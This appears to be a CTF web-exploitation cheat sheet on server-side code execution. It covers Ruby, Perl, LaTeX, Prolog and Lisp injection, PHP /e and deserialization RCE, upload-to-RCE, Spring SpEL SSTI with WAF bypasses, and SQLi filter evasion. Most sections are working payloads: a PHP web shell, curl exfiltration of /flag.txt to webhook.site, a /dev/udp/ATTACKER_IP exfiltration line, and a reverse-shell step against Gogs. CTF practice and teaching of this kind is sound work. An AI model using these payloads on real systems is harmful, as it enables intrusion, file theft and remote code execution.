# CTF Web - Server-Side Code Execution & Access Attacks

## Table of Contents
- [Ruby Code Injection](#ruby-code-injection)
  - [instance_eval Breakout](#instance_eval-breakout)
  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
  - [Exfiltration](#exfiltration)
- [Perl open() RCE](#perl-open-rce)
- [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
- [PHP preg_replace /e Modifier RCE (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
- [Prolog Injection (PoliCTF 2015)](#prolog-injection-polictf-2015)
- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
- [File Upload to RCE Techniques](#file-upload-to-rce-techniques)
  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
  - [PHP Log Poisoning](#php-log-poisoning)
  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
  - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
  - [ZipSlip + SQLi](#zipslip--sqli)
- [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
- [PHP extract() / register_globals Variable Overwrite (SecuInside 2013)](#php-extract--register_globals-variable-overwrite-secuinside-2013)
- [XPath Blind Injection (BaltCTF 2013)](#xpath-blind-injection-baltctf-2013)
- [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
- [WebSocket Mass Assignment](#websocket-mass-assignment)
- [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
- [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
- [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
- [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
- [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Race Conditions (TOCTOU)](#race-conditions-toctou) *(stub — see [server-side-deser.md](server-side-deser.md))*

For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

---

## Ruby Code Injection

### instance_eval Breakout
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

### Bypassing Keyword Blocklists
| Blocked | Alternative |
|---------|-------------|
| `File.read` | `Kernel#open` or class helper methods |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

### Exfiltration
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

**Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.

---

## Perl open() RCE
Legacy 2-argument `open()` allows command injection:
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

**Key insight:** Perl's 2-argument `open()` interprets mode characters in the filename itself. A leading or trailing pipe (`|`) causes command execution. Any Perl CGI or backend that opens a user-supplied filename with the 2-arg form is vulnerable to RCE.

---

## LaTeX Injection RCE (Hack.lu CTF 2012)

**Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.

**Read files:**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**Execute commands:**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /flag.txt"}
```

**Full payload as standalone document:**
```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

**Key insight:** LaTeX's `\input{|"cmd"}` syntax pipes shell command output directly into the document. The `\@@input` internal macro reads files without shell invocation. Use `\catcode` adjustments to handle special characters (underscores, braces) in command output.

**Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.

---

## Server-Side JS eval Blocklist Bypass

**Bypass via string concatenation in bracket notation:**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, reverse string
```

**Key insight:** JavaScript `eval` blocklists filtering keywords like `require`, `process`, or `constructor` are bypassed with string concatenation in bracket notation. `['con'+'structor']` accesses `Function` constructor, which creates functions from strings -- equivalent to `eval` with no keyword to block.

---

## PHP preg_replace /e Modifier RCE (PlaidCTF 2014)

**Pattern:** PHP's `preg_replace()` with the `/e` modifier evaluates the replacement string as PHP code. Combined with `unserialize()` on user-controlled input, craft a serialized object whose properties trigger a code path using `preg_replace("/pattern/e", "system('cmd')", ...)`.

```php
// Vulnerable code pattern:
preg_replace($pattern . "/e", $replacement, $input);
// If $replacement is attacker-controlled:
$replacement = 'system("cat /flag")';
```

**Via object injection (POP chain):**
```php
// Craft serialized object with OutputFilter containing /e pattern
$filter = new OutputFilter("/^./e", 'system("cat /flag")');
$cookie = serialize($filter);
// Send as cookie → unserialize triggers preg_replace with /e
```

**Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.

---

## Prolog Injection (PoliCTF 2015)

**Pattern:** Service passes user input directly into a Prolog predicate call. Close the original predicate and inject additional Prolog goals for command execution.

```text
# Original query: hanoi(USER_INPUT)
# Injection: close hanoi(), chain exec()
3), exec(ls('/')), write('\n'
3), exec(cat('/flag')), write('\n'
```

**Identification:** Error messages containing "Prolog initialisation failed" or "Operator expected" reveal the backend. SWI-Prolog's `exec/1` and `shell/1` execute system commands.

**Key insight:** Prolog goals are chained with `,` (AND). Injecting `3), exec(cmd)` closes the original predicate and appends arbitrary Prolog goals. Similar to SQL injection but for logic programming backends. Also check for `process_create/3` and `read_file_to_string/3` as alternatives to `exec`.

---

## ReDoS as Timing Oracle

**Pattern (0xClinic):** Match user-supplied regex against file contents. Craft exponential-backtracking regexes that trigger only when a character matches.

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

**Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.

---

## File Upload to RCE Techniques

**Key insight:** File upload vulnerabilities become RCE when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.

### .htaccess Upload Bypass
1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
3. Access `rce.lol?cmd=cat+flag.txt`

### PHP Log Poisoning
1. PHP payload in User-Agent header
2. Path traversal to include: `....//....//....//var/log/apache2/access.log`

### Python .so Hijacking (by Siunam)
1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

### Gogs Symlink RCE (CVE-2025-8110)
1. Create repo, `ln -s .git/config malicious_link`, push
2. API update `malicious_link` → overwrites `.git/config`
3. Inject `core.sshCommand` with reverse shell

### ZipSlip + SQLi
Upload zip with symlinks for file read, path traversal for file write.

---

## PHP Deserialization from Cookies
```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```
Replace cookie with base64-encoded malicious serialized data.

**Key insight:** PHP cookies containing base64-encoded data are likely `unserialize()` targets. Craft a serialized object with a `path` property pointing to `flag.txt` or inject a POP chain for RCE. Decode the existing cookie first to identify the class name and property structure.

---

## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)

**Pattern:** `extract($_GET)` or `extract($_POST)` overwrites internal PHP variables with user-supplied values, enabling database credential injection, path manipulation, or authentication bypass.

```php
// Vulnerable pattern
if (!ini_get("register_globals")) extract($_GET);
// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
```

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

**Key insight:** `extract()` imports array keys as local variables. Overwrite database connection parameters to point to an attacker-controlled MySQL server, then return crafted query results (file paths, credentials, etc.).

**Detection:** Search source for `extract($_GET)`, `extract($_POST)`, `extract($_REQUEST)`. PHP `register_globals` (removed in 5.4) had the same effect globally.

---

## XPath Blind Injection (BaltCTF 2013)

**Pattern:** XPath queries constructed from user input enable blind data extraction via boolean-based or content-length oracles.

```text
-- Injection in sort/filter parameter:
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2

-- Boolean detection: response length > threshold = true
-- Extract character by character:
for pos in range(1, 100):
    for c in string.printable:
        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': payload}).text) > 1050:
            result += c; break
```

**Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).

---

## API Filter/Query Parameter Injection

**Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

## HTTP Response Header Data Hiding

Proof/flag in custom response headers (e.g., `x-archive-tag`, `x-flag`):
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

**Key insight:** Flags and proof codes hidden in custom HTTP response headers (e.g., `x-flag`, `x-archive-tag`) are invisible in browser-rendered responses. Always inspect response headers with `curl -sI` or browser dev tools, especially for API endpoints.

---

## WebSocket Mass Assignment
```json
{"username": "user", "isAdmin": true}
```
Handler doesn't filter fields → privilege escalation.

**Key insight:** WebSocket handlers that directly map JSON properties to objects without whitelisting allow mass assignment. Add privileged fields like `isAdmin`, `role`, or `balance` to the JSON payload -- if the server doesn't explicitly filter them, they overwrite the corresponding object properties.

---

## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)

**Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.

**Attack chain:**
1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
2. **SpEL injection** via template preview endpoint
3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**Key insight:** Distroless containers have no shell (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.

**Alternative SpEL file read payloads:**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.

---

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

**Pattern:** Single-pass `preg_replace()` keyword filters can be bypassed by nesting the stripped keyword inside the payload word.

**Key insight:** If the filter strips `load_file` in a single pass, `unload_fileon` becomes `union` after removal. The inner keyword acts as a sacrificial fragment.

```php
// Vulnerable filter (single-pass, case-sensitive)
$str = preg_replace("/union/", "", $str);
$str = preg_replace("/select/", "", $str);
$str = preg_replace("/load_file/", "", $str);
$str = preg_replace("/ /", "", $str);
```

```sql
-- Bypass payload (spaces replaced with /**/ comments)
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
-- Or nest the stripped keyword:
unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
```

**Variations:** Case-sensitive filters: mix case (`unIoN`). Space filters: `/**/`, `%09`, `%0a`. Recursive filters: double the keyword (`ununionion`). Always test whether the filter is single-pass or recursive.

---

## SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)

When `WHERE` clause restrictions prevent direct filtering, use `ORDER BY CASE` to control result ordering and extract data:

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

**Key insight:** Even without WHERE access, ORDER BY with conditional expressions forces target rows to appear first in results. Combine with `LIMIT 1` to isolate specific records.

---

## SQL Injection via DNS Records (PlaidCTF 2014)

**Pattern:** Application calls `gethostbyaddr()` or `dns_get_record()` on user-controlled IP addresses and uses the result in SQL queries without escaping. Inject SQL through DNS PTR or TXT records you control.

**Attack setup:**
1. Set your IP's PTR record to a domain you control (e.g., `evil.example.com`)
2. Add a TXT record on that domain containing the SQL payload
3. Trigger the application to resolve your IP (e.g., via password reset)

```php
// Vulnerable code:
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$details = dns_get_record($hostname);
mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
// TXT record: "' UNION SELECT flag FROM flags-- "
```

**Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.

---

## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)

When spaces and common shell metacharacters (`$`, `&`, `\`, `;`, `|`, `*`) are filtered, use bash brace expansion and process substitution:

```bash
# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
{ls,-la,../..}

# Exfiltrate via UDP when outbound TCP is blocked:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# Execute base64-encoded payload:
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**Key insight:** Bash brace expansion `{a,b,c}` splits into space-separated tokens without requiring literal space characters. Combined with `/dev/udp/` or `/dev/tcp/` for exfiltration, this bypasses filters that block spaces and most shell metacharacters.

---

## Common Lisp Injection via Reader Macro (Insomnihack 2016)

Lisp's `read` function evaluates `#.(expression)` reader macros at parse time. When an application uses `read` for user input (instead of `read-line`), arbitrary code execution is possible:

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

**Key insight:** Lisp's `read` treats data as code by design -- the `#.()` reader macro evaluates arbitrary expressions during parsing. This is analogous to SQL injection but for Lisp. Safe alternative: use `read-line` for string input, never `read` on untrusted data.

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) for full exploit code.

---

## Java Deserialization (ysoserial)

Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use ysoserial gadget chains (CommonsCollections, URLDNS for blind detection). See [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial) for payloads and bypass techniques.

---

## Python Pickle Deserialization

`pickle.loads()` calls `__reduce__()` for instant RCE via `(os.system, ('cmd',))`. Common in Flask sessions, ML model files, Redis objects. See [server-side-deser.md](server-side-deser.md#python-pickle-deserialization) for payloads and restricted unpickler bypasses.

---

## Race Conditions (TOCTOU)

Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-toctou) for async exploit code and detection patterns.

---

*See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*
